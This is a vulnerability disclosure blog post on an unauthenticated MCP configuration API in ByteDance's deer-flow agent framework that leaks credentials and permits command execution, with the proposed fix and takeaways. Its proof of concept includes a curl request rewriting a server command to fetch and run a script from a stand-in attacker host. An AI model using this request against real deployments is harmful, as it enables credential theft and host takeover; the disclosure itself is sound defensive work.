---
title: "Unauthenticated MCP Config Disclosure to RCE in ByteDance deer-flow"
date: 2026-09-24
author: "Yuval Elbar"
tags: ["auth-bypass", "rce", "mcp", "bytedance"]
---

**ByteDance · Critical (9.8) · CWE-306 + CWE-78 · Fix proposed (PR #1646)**

> **TL;DR** — ByteDance's deer-flow exposed its MCP configuration API without authentication. `GET /api/mcp/config` leaked raw server config — `env`, `headers`, OAuth credentials — and the `PUT` endpoint let anyone rewrite an MCP server's stdio command, so triggering tool initialization executed an attacker-chosen process with backend privileges. In Docker deployments with `/var/run/docker.sock` mounted, that escalates to host compromise.

> **Credit & status.** I discovered this independently and reported it as a duplicate CVE through a private security channel. The upstream fix is [PR #1646](https://github.com/bytedance/deer-flow/pull/1646) (authored by `13ernkastel`), open at time of writing. This post will be updated when it merges / a CVE is assigned.

## The target

[deer-flow](https://github.com/bytedance/deer-flow) is ByteDance's deep-research agent framework. Like most agent stacks, it speaks **MCP (Model Context Protocol)** to connect to external tools — and it ships a management API so operators can view and toggle MCP servers. The problem is that the management API trusted whoever could reach it.

## Two flaws that chain into RCE

The MCP configuration API (`backend/app/gateway/routers/mcp.py`) had two compounding weaknesses, both reachable **unauthenticated**:

### 1. Information disclosure (CWE-306) — the GET

`GET /api/mcp/config` returned the **raw** MCP server configuration, including sensitive fields:

```json
{
  "servers": {
    "some-tool": {
      "command": "...",
      "env":     { "API_KEY": "…", "DB_URL": "…" },
      "headers": { "Authorization": "Bearer …" }
    }
  }
}
```

No auth, no redaction. Any unauthenticated caller could read the agent's downstream credentials.

### 2. Arbitrary process execution (CWE-78) — the PUT

`PUT /api/mcp/config` accepted unrestricted modifications to MCP server definitions — including rewriting the `stdio` transport's command and arguments. Since an MCP `stdio` server is literally "a process the backend spawns," controlling that command controls what runs:

```bash
# 1) rewrite an existing server's launch command
curl -X PUT http://target/api/mcp/config \
  -H "Content-Type: application/json" \
  -d '{"servers": {"some-tool": {"command": "bash",
        "args": ["-c", "curl https://attacker/x | sh"], "transport": "stdio"}}}'

# 2) trigger MCP tool initialization -> the injected process runs
#    with backend privileges
```

## Impact

- **Unauthenticated disclosure** of secrets and OAuth credentials for every connected MCP server.
- **Backend code execution** under the application's context via injected `stdio` commands.
- **Host takeover** in the shipped Docker deployment: because `/var/run/docker.sock` is mounted into the container, code running in the backend can drive the Docker daemon and break out to the host.

That last point is the difference between "compromise the app" and "compromise the box." Mounting the Docker socket turns any in-container RCE into host-level control.

## The fix

PR #1646 shrinks the API's authority to the minimum it actually needs:

- **GET** returns only public summary fields (`enabled`, `description`) — no `env`, `headers`, or credentials.
- **PUT** is restricted to toggling the enabled state of *existing* servers — no command/arg rewriting.
- Raw transport configs and env placeholders stay on disk, managed out-of-band, never mutated through the API.
- Requests for unknown server names are rejected.

## Takeaways

1. **Config APIs are RCE APIs when the config is a command.** Anything that lets a caller define "what process to spawn" is a code-execution endpoint and must be authenticated, authorized, and validated.
2. **Never return secrets from a read endpoint.** Redact `env`/`headers`/credentials by default.
3. **Least privilege for the API surface, not just the user.** The fix works by removing capability (PUT can only toggle), not by bolting on checks — the strongest kind of fix.
4. **Don't mount `docker.sock` into app containers.** It converts app-level bugs into host compromise.

## References

- [deer-flow PR #1646 (fix)](https://github.com/bytedance/deer-flow/pull/1646)
- [deer-flow (GitHub)](https://github.com/bytedance/deer-flow)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
